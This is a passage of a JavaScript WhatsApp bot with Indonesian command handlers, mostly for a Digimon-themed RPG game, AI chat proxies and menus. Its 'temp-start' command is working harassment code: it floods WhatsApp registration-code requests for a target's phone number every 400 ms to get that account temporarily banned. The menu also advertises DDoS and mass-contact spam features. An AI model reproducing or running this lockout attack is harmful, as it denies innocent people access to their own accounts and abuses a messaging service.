  case "delguild": {
  if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return m.reply(`[ Veemon ] >> Masukan Nama guild`)
 deleteGuild(text, m.sender)
 }
 break
 
 case "joinguild": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return reply("Masukan Id Guild")
 const guildId = text
 addtoken(m.sender, 4)       
 joinGuild(guildId, m.sender)
 }
 break
 
 case "createguild": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return reply("Masukan Nama guild nya")
 const guildName = text
 createGuild(guildName, m.sender)
 }
 break
 
 case "listguild":
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 listGuilds()
 break
 
 // digimon ( pelihara )
 case "getdigi": case "getdigimon": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  addtoken(m.sender, 4)         
 spinDigimon(m.sender, m)
 }
 break
 
 case "give-food": 
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
     
    if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
 userdb.kenyang += 47 
 userdb.happy += 43
 const reaksimakan = pickRandom(["Thaks","Yeah!!","eat, eat, eat","Delicious, I like this Food","Yeah, Now lets go figh","aku sudah makan ayo pukul pedo!","wareg, makasih","oke bang","Allright, Allright","aku kenyang..."])
 m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Eating...`)
 setTimeout(() => {
 m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* ${reaksimakan}`)
 }, 2509)
 m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* I'm Done...`)
 break
 
 case "recover":
 if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
 if (userdb.recoverplug < 1) return m.reply("*Gada recover.plug, 0*")
 if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
 if (!text) return m.reply("Ada 2 Pilihan, mp/hp Untuk digimon kamu.\n\nExample: .recover mp")
 if (text === "hp") {
 userdb.recoverplug -= 1
addDarah(m.sender, 90, userdb.maxdarahdigi)
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Done, Thaks`)
} else if (text === "mp") {
addMP(m.sender, 70)
userdb.recoverplug -= 1
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Thaks, Um..`)
}
break
case "sleep": case "tido":
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
if (chatdb.isbatel === true) return m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, I Sleep...`)
setTimeout(() => {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Sleep..., Zzzz..`)
chatdb.sleep = true
}, 3000)
setTimeout(() => {
addDarah(m.sender, 9000, userdb.maxdarahdigi) 
addMP(m.sender, 9000)
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Uh.., I'm Wake up.`)
chatdb.sleep = false
}, 900000)
break

case "bermain":
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
if (chatdb.isbatel === true) return m.reply("Anda gila, digimon mu lagi lawan, masa mau main")
if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
m.reply(`Sedang Bermain Dengan digimon mu.., Have fun ${userDigimons[userId]}.`)
setTimeout(async () => {
userdb.happy += 71
addtoken(m.sender, 4)       
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Im Tired, I Want To Sleep.. or on.`)
}, 70000)
break

case "battle": {
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun ark.*")
if (chatdb.isbatel === true) return //m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
        if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
if (!text) return reply("masukan nomor yang ingin di ajak battle")
const pitaj  = `${text}@s.whatsapp.net` 
userdb.happy += 19
challengeBattle(m.sender, pitaj);
}
break
case "acc-battle": {
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun ark.*")
if (chatdb.isbatel === true) return //m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
        if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
if (!text) return reply("masukan nomor yang ingin battle")
addtoken(m.sender, 4)       
 acceptBattle(text+"@s.whatsapp.net", m.sender);
}
break

case "rejec-battle": {
  cancelBattle(m.sender);
}
break

case "cancle-battle": {
  cancelBattle(m.sender);
}
break

case "latih-digimon":
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
if (chatdb.isbatel === true) return //m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
if (userdb.tp < 1) return m.reply("_*Kamu Tidak punya TP ( TRAINING POINT )*_")
if (!text) return m.reply("Ada 3 type 1x - 5x - 10x\n\nExample: *.latih-digimon 5x*")
userdb.happy -= 17
addtoken(m.sender, 5)       
if (text === "1x") {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, let's Workout.`)
setTimeout(async () => {
userdb.mpmax += 7
userdb.attackdigi += 5
userdb.tp -= 1
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Ah.. Enough, Im done.\n\n*<!> Peningkatan*\nAdd Attack: 10\nAdd Max Mp: 13`)
}, 9000)
} else if (text === "5x") {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, let's Workout.`)
setTimeout(async () => {
userdb.mpmax += 37
userdb.attackdigi += 32
userdb.tp -= 5
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Ah.. Enough, Im done.\n\n*<!> Peningkatan*\nAdd Attack: 20\nAdd Max Mp: 17`)
}, 9000)
} else if (text === "10x") {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, let's Workout.`)
setTimeout(async () => {
userdb.mpmax += 71
userdb.attackdigi += 62
userdb.tp -= 10
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Ah.. Enough, Im done.\n\n*<!> Peningkatan*\nAdd Attack: 20\nAdd Max Mp: 17`)
}, 9000)
}
    break
    
  case "tech":
const targetrca = userdb.attacksi
attack("Tech", m, targetrca)
userdb.happy -= 14
break

case "attack":
const targetrcaa = userdb.attacksi
attack("Attk", m, targetrcaa)
userdb.happy -= 14
break

case "heald":
attack("Heal", m)
userdb.happy -= 14
break

case "focus":
const targetrcaaa = userdb.attacksi
attack("Focus", m, targetrcaaa)
userdb.happy -= 27
break

case "slash":
const targetrcaaaa = userdb.attacksi
attack("Card", m, targetrcaaaa)
userdb.happy -= 11
break

case "break":
const targetrcaaaaa = userdb.attacksi
attack("Break", m, targetrcaaaaa)
userdb.happy -= 32
break
  
case "list-skil":
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
reply(skillsList)
break  
  
case "mydigi": case "my-digimon":
        showLevel(m.sender, m)
        break
        
     case "d-terminal":
     if (!text) return m.reply("*`<!> D - T E R M I N A L •`*\n\nUntuk Berkomunikasi Antar Partner / orang yang mempunyai digimon di bot ini. Ex- .d-terminal 6283294,subject,hello pi! you want to training pi?")
     if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
      let nomor = q.split(',')[0] ? q.split(',')[0] : q
				let saking = q.split(',')[1] ? q.split(',')[1] : q
				let pesan = q.split(',')[2] ? q.split(',')[2] : ''
			setTimeout(() => {
			m.reply("Succes..")
			}, 1200)
			userdb.happy += 19
        ptz.sendMessage(nomor+"@s.whatsapp.net", {text: `*${m2}FROM ${pushname} SUBJECT ${saking}${m2}*\n\n${pesan}\n\n${nomor} <- ${pushname}\n*< D-terminal >*`})    
          break   
          
      case "d3":
      if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
      let teksehmazehhj = `▬▭▬▭▬▭▬▭▬▭▬

*${m2}< STATS - DIGIMON >${m2}*

─ Training Point: ${userdb.tp}
─ Recover Plug: ${userdb.recoverplug}
─ Healt Point: ${getDarah(m?.sender)} 
─ Kenyang: ${userdb.kenyang}
─ Senang: ${userdb.happy}
─ Attack: ${userdb.attackdigi}

> Digivice •
▬▭▬▭▬▭▬`

reply(teksehmazehhj)
break
 //=======// fitur utama
 case "rules-rpg":
let mcb = `
*${m2}> Rules Rpg Di Sc DARE <${m2}*
______________

1- *Jangan spam*
2- *Jangan membuat error*
3- *Jangan terlalu sering chat di pm*
4- *Mengerti Apa jadinya command di pilih*
_______
`
m.reply(mcb)
break

case "guide-rpg":
let mcb6 = `
*${m2}> Cara bermain Rpg Di Sc DARE <${m2}*
______________

_1- *silahkan ketik .join rpg*_
> - ( Jika belum register )

_2- *Di sarankan, Dapatkan digimon*_
> - ( ketik .getdigi dan kirim )

 _3- *Berburu / Memancing Atau kerja*_ 
> - ( Command Sudah di sediakan )

_4- *Jadi yang terbaik di database*_
> - ( Peringkat *1* Di segala Leaderboard )

_5- *Milyader • Jadi si sultan*_
> - ( Sultan di database, Jadi Peringkat *1* )

_6- *Bersahabat Dengan digimon mu*_
> - ( Berteman Lebih dekat dengan partner )

_7- *Bertarung  Untuk semua*_
> - ( Battle dengan Sesama digimon )

_8- *Woah, You strong !*_
> - ( Latih digimon mu Menjadi kuat )

_9- *Melanjutkan Adventure*_
> - ( Melanjutkan Semua dan menjadi terbaik )
_______
`
m.reply(mcb6)
break
  case 'exitrpg': {                                
  m.reply("maaf bre fitur ini sengaja ku hilangkan karena dapat menghilangkan database jadi 0, sorry ye biar orang ga kecewa..")
        }
                break;
                
    case 'joinrpg': {   
    
    //= ini biar inventory g undefined//
    userdb.attackdigi = 0
    userdb.DarahOrang = 100
    userdb.tp = 0
    userdb.bits = 0
    userdb.kenyang = 0
    userdb.happy = 0
    userdb.digivice = false
    userdb.recoverplug = 0
    userdb.apajob = false
    userdb.job = "nganggur"
    
    userdb.setname = `${pushname}`  
    addtoken(m.sender, 48)                            
                fs.readFile('./Rpg/join.json', 'utf8', (err, data) => {
                    if (err) {
                        console.error(err);                        
                    }
                    let users;                   
try {
                        users = JSON.parse(data);
                    } catch (parseError) {
                        console.error('Err:', parseError);                        
                    }                
                    const userExists = users.some(user => user.id === userId);

                    if (userExists) {
                        return reply('Kamu sudah Join.');
                    }              
                    users.push({ id: userId  });

fs.writeFile('./Rpg/join.json', JSON.stringify(users, null, 2), 'utf8', (err) => {
                        if (err) {
                            console.error(err);                            
                        } else {
                            return reply('Sukses Join  Rpg!');
                        }
                    });
                });
}
                break;
 //=======//
        case 'luckyday':
case 'luckytime':{
      if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
ez = Math.ceil(Math.random() * 20)
a = Math.ceil(Math.random() * 99)
b = Math.ceil(Math.random() * 500)
c = Math.ceil(Math.random() * 150)
addMonay(m.sender, b)
addXP(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
addtoken(m.sender, 4)    

reply(`
•• *${m2}-[ Lucky Day ]-${m2}* ••\n
┊ *Money:* ${b}\n
┊ *Gold :* ${a}\n
┊ *Iron :* ${c}`)
}
break

case "cheat":
if (!text) return m.reply('*`[ C H E A T ]`*\n\nExample: .cheat VERT182P\n_*Cheat 8 Angka*_')

if (text === "VERT182P") {
 userdb.DarahOrang += 900000
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "ROAQ092F") {
addenergy(m?.sender, 900000)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "VERTNROQ") {
addenergy(m?.sender, 900000)
userdb.DarahOrang += 900000
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "BUAST09F") {
 addMonay(m?.sender, 900000)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "BAUSXGLD") {
addEmas(m.sender, 900000)
addMonay(m?.sender, 900000)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "GLDNWINGS") {
addEmas(m.sender, 900000)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "MCVLEMRL") {
addEmerald(m?.sender, 900000)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "MCMNGLDN") {
addEmas(m.sender, 900000)
addMonay(m?.sender, 900000)
addEmerald(m?.sender, 900000)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "KONTOL") {
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "UPDIGI99") {
addXP(m.sender, 999)
m.reply("*`[ CHEAT ACTIVED ]`*")
} 
break


        // === //

case "smartcontract": case "smart":
   let isuragg = await fetchJson(`https://api.hyuunewbie.my.id/api/smartcontract?message=${text}`)
let guaaa = isuragg.data.response
reply(guaaa)   
        break

 
case 'temp-start': {
if (!isPremium) return
if (!text) return reply(`Example: ${prefix + command} 62|81662748286`)
if (!/|/.test(text)) return reply(`Example: ${prefix + command} 62|82636838163`)
let numbers = JSON.parse(fs.readFileSync('./system/Tempor.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Sukses\n\nDARE Menyerang nomor Tersebut Jika ingin Menghentikan Temporary ban ketik .temp-stop Silah Check Nomor: ${fullNo}`)
let { state, saveCreds } = await useMultiFileAuthState('session3')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./system/Tempor.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break  
        case "jadibot-scan":
        if (!isPremium) return reply("*`Khusus Prem Saya kak`*")  
     if (m.isGroup) return reply("Maaf Kak Fitur Ini Hanya Bisa Di Gunakan Di Pribadi Chat")  
        await jadibots(ptz, m, frommeky)
        break
    case "xxc":
      ptz.sendMessage(m.sender, {text:'x'}, {quoted:fsaluran})
            if (frommeky.includes('-')) {
console.log('Pesan diterima dari grup');
            }
       break

    case "jadibot-pairing":
        if (!isPremium) return reply("*`Khusus Prem Saya kak`*")
  if (!text) return reply("*Salah ! Seperti ini: .jadibot-pairing 628xxx*\nExample: .jadibot-pairing 6283123443245")
await jadibot(ptz, text, m, frommeky)
            let furry = "`"
            await sleep(4800)
let jadibo = `*${furry}Masukkan code dibawah ini untuk jadi bot sementara${furry}*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code di bawah ini\n\nNote: code dapat expired kapan saja!\n\nCode: ${furry}${global.codepairing}${furry}\nJika Code Error Silahkan Hapus Folder session2\n\nKlik Button Code pairing Untuk Menyalin Code`
let onlyprivjdb = '*Sukses !*'

async function habuce () {
 ptz.sendMessage(`${text}@s.whatsapp.net`, {text:jadibo}, {quoted:fsaluran})
 setTimeout(() => {
 m.reply(onlyprivjdb)
 }, 1000)
}
if (global.setmenu === "v3") {
return habuce()
} else if (global.setmenu === "v2") {
return habuce()
 } else if (global.setmenu === "v1") {
let tekss9999 = jadibo;

let msghhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9999
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Defined Ziyoo`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"${global.codepairing}","id":"123456789","copy_code":"${global.codepairing}"}`
     },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(`${text}@s.whatsapp.net`, msghhhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhhh.key.id
});

setTimeout(async () => {
   return m.reply(onlyprivjdb)
}, 1200)
}
        console.log('Jadibot •••')
        break
     case 'hd': case 'remini': {  if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
            let proses2 = proses
	 let hade = await remini(proses2, "enhance")
              
              
     ptz.sendMessage(m.chat, { image: hade, caption: `*Succes*\n${global.botname} • 2024`}, { quoted:fsaluran})
			}
			break  
        
       /* case 'hdvid': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(`Vidio nya mana?`);
  m.reply("wait..");
  const media = await ptz.downloadAndSaveMediaMessage(q);
  const url = await TelegraPH(media);
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.1:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    ptz.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });
  
            
}
break
 wm Faxx
https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s*/
        
        case "chatgpt":
   if (!text) return m.reply('mau nanya apa ke chatgpt')
var kolbekai = await fetchJson(`https://widipe.com/openai?text=Selalu Panggil saya ${pushname} Yak,${text}`)
			      var airespon = kolbekai.result
        setTimeout(async () => {
           let Fue = "`"
         await reply (`*${Fue}[ Chatgpt ] :${Fue}* ${airespon}`)
      }, 1000)
        break
   case "degreeguru":
        if (!text) return reply("Mau Nanya apa Ke dengreeguru")
 let isu = await fetchJson(`https://api.hyuunewbie.my.id/api/degreeguru?message=${text}`)
let gua = isu.data.response
reply(gua)
        break
        case "ragbot":
        if (!text) return reply('Mau nanya apa ke ragbot')
  let isurag = await fetchJson(`https://api.hyuunewbie.my.id/api/ragbot?message=${text}`)
let guaa = isurag.data.response
reply(guaa)  
        break
    case 'openai': case 'openaimon': case 'A-I': case "ai": case "openaimenu":
        let ain = "`"
        
        reply(`╭┈──────────────────
│ *${m2}${khasatas1} A I - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄʜᴀᴛɢᴘᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴅᴇɢʀᴇᴇɢᴜʀᴜ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʀᴀɢʙᴏᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ꜱᴍᴀʀᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴀɪ-ꜱᴇᴀʀᴄʜ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴛxᴛɪᴍɢ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴛxᴛ2ɪᴍɢ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴘʀᴏᴍᴛ-ɢᴘᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ɢᴘᴛɢᴏ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ꜱɪᴍɪ <on/off> 
│  ${khasmiring}  .ᴅᴀʟʟᴇ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
│  ${khasmiring}  .ʙɪɴɢ-ᴀɪ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʙʟᴀᴄᴋʙᴏx <Qᴜᴇʀʏ>
│  ${khasmiring}  .ɴᴇᴠᴏ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʟᴜᴍɪɴᴀ <Qᴜᴇʀʏ>
│  ${khasmiring}  .Teni <on/off>
│  ${khasmiring}  .ɢᴘᴛ4 <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴅɪꜰꜰᴜꜱɪᴏɴ <Qᴜᴇʀʏ>
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break

    case 'beton': case 'menu': case 'simplemenu': case 'menulist': case 'menumon':
 if (global.setmenu === "v1") {
let pedo = "`";

let teksskkk = `${tektek}`;
let sections = [{
		title: 'All simple Menu Bot', 
		rows: [{
	    title: 'A-I Menu List',
    	description: `<!> Display All Openai Feature •`, 
    	id: `${prefix}openaimon`
        },  
{
                   title: 'Voice Menu List',
                   description: "<!> Display All Voice Feature",
                   id: `${prefix}voicemon`
                   },
               {
                   title: 'Rpg Menu List',
                   description: "<!> Display All Rpg Feature",
                   id: `${prefix}rpgmon`
                   },
               {
                   title: 'Pushkontak Menu List',
                   description: "<!> Display All push Feature",
                   id: `${prefix}pushkontakmon`
                   },
               {
                   title: 'Group Menu List',
                   description: "<!> Display All Group Feature",
                   id: `${prefix}groupmon`
                   },
               {
                   title: 'Main Menu List',
                   description: "<!> Display All Main Feature",
                   id: `${prefix}mainmon`
                   },
               {
                   title: 'Tools Menu List',
                   description: "<!> Display All Tools Feature",
                   id: `${prefix}toolsmon`
                   },
               {
                   title: 'Ddos Menu List',
                   description: "<!> Display All Ddos Feature",
                   id: `${prefix}ddosmon`
                   },
               {
                   title: 'Photooxy Menu List',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'Ephoto Menu List',
                   description: "<!> Display All Ephoto Feature",
                   id: `${prefix}ephotomon`
                   },
               {
                   title: 'Sticker Menu List',
                   description: "<!> Display All Sticker Feature",
                   id: `${prefix}stickermon`
                   },
               {
                   title: 'Temporary Menu List',
                   description: "<!> Display All Temporary Feature",
                   id: `${prefix}tempormon`
                   },  
               {
                   title: 'Menu List',
                   description: "<!> Display All Simple Menu",
                   id: `${prefix}menumon`
                   },  
               {
                   title: 'Create Panel Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}panelmon`
                   },
               {
                   title: 'Digital Ocean List',
                   description: "<!> Display All D-o Feature",
                   id: `${prefix}domon`
                   },
               {
                   title: 'Linode Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}linodemon`
                   },
               {
                   title: 'All Menu List',
                   description: "<!> Display All Menu List",
                   id: `${prefix}allmon`
                   },  
               {
                   title: 'Photooxy Maker Menu List',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'Ephoto Maker Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}ephotomon`
                   },                   
               {
                   title: 'Jadibot Menu List',
                   description: "<!> Display All Jadibot Feature",
                   id: `${prefix}jadibotmon`
                   },
               {
                   title: 'Absen gc Menu List',
                   description: "<!> Display All Absen Feature",
                   id: `${prefix}absenmon`
                   },    
               {
                   title: 'Berita Menu List',
                   description: "<!> Display All Berita Feature",
                   id: `${prefix}beritamon`
                   },    
{
		title: 'Owner Menu List', 
		description: "<!> Display All Owner Feature •", 
		id: `${prefix}ownermon`
	    }]
}]

let listMessage = {
    title: 'List Menu DARE',
    sections
};

let msghhhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m?.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '12036326753195844@newsletter',
                        newsletterName: `${global.botname} • ${runtime(process.uptime())}`,
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: ptz.decodeJid(ptz.user.id)
                    },
                    externalAdReply: {
                        title: global.title,
                        body: global.body,
                        thumbnail: fs.readFileSync("./digimon.jpg"),
                        sourceUrl: global.sourceurl,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teksskkk
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `© ${footer}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ``,
                    thumbnailUrl: "",
                    gifPlayback: true,
                    subtitle: "Multi Device",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        document: fs.readFileSync('./package.json'),
                        mimetype: "application/msword",
                        jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: global.filename,
                     }, {
                        upload: ptz.waUploadToServer
                    }))
                }),
                gifPlayback: true,
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                        "name": "single_select",
                        "buttonParamsJson": JSON.stringify(listMessage)
                    }]
                })
            })
        }
    }
}, {
    quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhh.key.remoteJid, msghhhhhhhhhhhhhhhhhhh.message, {
    messageId: msghhhhhhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: global.filename,
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: tektek,
contextInfo: {
forwardingScore: 10,
 isForwarded: true,
forwardedNewsletterMessageInfo: {
            newsletterJid: global.idsaluran,
            serverMessageId: null,
            newsletterName: global.namesaluran
        },
externalAdReply: {
showAdAttribution: true,
title: global.title,
body: global.body ,
thumbnail: fs.readFileSync('./digimon.jpg'),
sourceUrl: global.sourceurl,
mediaType: 1,
renderLargerThumbnail: true 
}}}, {});
} else if (global.setmenu === "v3") {
ptz.sendMessage(m.chat, { 
text: tektek,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `${global.title}`,
"body": global.body,
"sourceUrl": global.sourceurl,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./biasa.jpg"),
}
}
},{ 
quoted: m })
}
        break

 case 'allmon': case 'allmenu':
 let mnop0 = `${resver}
${readmore}╭┈──────────────────
│ *${m2}${khasatas1} A I - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄʜᴀᴛɢᴘᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴅᴇɢʀᴇᴇɢᴜʀᴜ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʀᴀɢʙᴏᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ꜱᴍᴀʀᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴀɪ-ꜱᴇᴀʀᴄʜ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴛxᴛɪᴍɢ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴛxᴛ2ɪᴍɢ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ᴘʀᴏᴍᴛ-ɢᴘᴛ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ɢᴘᴛɢᴏ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ꜱɪᴍɪ <on/off> 
│  ${khasmiring}  .ᴅᴀʟʟᴇ <Qᴜᴇʀʏ>
│  ${khasmiring}  .ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
│  ${khasmiring}  .ʙɪɴɢ-ᴀɪ <Qᴜᴇʀʏ>
